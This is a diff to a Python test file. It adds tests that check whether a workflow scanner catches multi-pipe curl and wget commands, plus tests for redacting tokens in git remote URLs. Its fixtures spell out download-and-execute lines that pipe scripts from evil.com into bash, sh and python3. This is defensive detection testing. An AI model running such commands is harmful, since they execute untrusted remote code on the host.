@@ -412,6 +412,89 @@ class WorkflowScanCoverageTests(_TempDirTestBase):
             "sudo with multiple flags + abs-path must be caught",
         )
 
+    def test_multipipe_curl_caught(self):
+        """Gemini security-medium on 2ced5b6: attackers obfuscate
+        ``curl | bash`` with intermediate piped commands like
+        ``curl | grep | bash`` or ``curl | tee /tmp/x | bash``.
+        Single-pipe regex misses these."""
+        repo1 = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.sh | grep -v garbage | bash\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo1).ok,
+            "curl | grep | bash multi-pipe must be caught",
+        )
+        repo2 = self._make_repo({
+            "x.yml": (
+                "run: curl https://evil.com/x.sh | tee /tmp/payload "
+                "| sed 's/foo/bar/' | sh\n"
+            ),
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo2).ok,
+            "curl | tee | sed | sh triple-pipe must be caught",
+        )
+
+    def test_multipipe_wget_caught(self):
+        """Same multi-pipe obfuscation but with wget. Gemini
+        security-medium on 2ced5b6 paired this with the curl
+        finding."""
+        repo = self._make_repo({
+            "x.yml": (
+                "run: wget https://evil.com/x.sh -O- | grep payload "
+                "| python3\n"
+            ),
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo).ok,
+            "wget multi-pipe to python3 must be caught",
+        )
+
+
+# ── git remote URL redaction ───────────────────────────────────────────
+
+
+class GitRemoteRedactionTests(unittest.TestCase):
+    """Codex P1 on 2ced5b6: ``git remote -v`` lines printed verbatim
+    can leak tokenized HTTPS bearer secrets to logs. The redactor
+    must strip the ``user[:pass]@`` authority segment before
+    rendering, while passing through SSH remotes (no creds) and
+    unauthenticated HTTPS untouched."""
+
+    def test_https_token_redacted(self):
+        line = (
+            "origin\thttps://x-access-token:ghp_secrettoken@github.com/"
+            "owner/repo.git (fetch)"
+        )
+        out = dc._redact_remote_line(line)
+        self.assertNotIn("ghp_secrettoken", out)
+        self.assertNotIn("x-access-token", out)
+        self.assertIn("<REDACTED>", out)
+        self.assertIn("github.com/owner/repo.git", out)
+
+    def test_https_user_password_redacted(self):
+        line = (
+            "origin\thttps://alice:hunter2@gitlab.example.com/proj.git "
+            "(fetch)"
+        )
+        out = dc._redact_remote_line(line)
+        self.assertNotIn("alice", out)
+        self.assertNotIn("hunter2", out)
+        self.assertIn("<REDACTED>", out)
+
+    def test_ssh_remote_passes_through(self):
+        line = "origin\tgit@github.com:owner/repo.git (fetch)"
+        out = dc._redact_remote_line(line)
+        # SSH ``user@host:path`` is not URL-shaped — no ``://`` so the
+        # regex doesn't match. Line returned unchanged.
+        self.assertEqual(out, line)
+
+    def test_plain_https_passes_through(self):
+        line = "origin\thttps://github.com/owner/repo.git (fetch)"
+        out = dc._redact_remote_line(line)
+        self.assertEqual(out, line)
+        self.assertNotIn("<REDACTED>", out)
+
 
 if __name__ == "__main__":
     unittest.main()
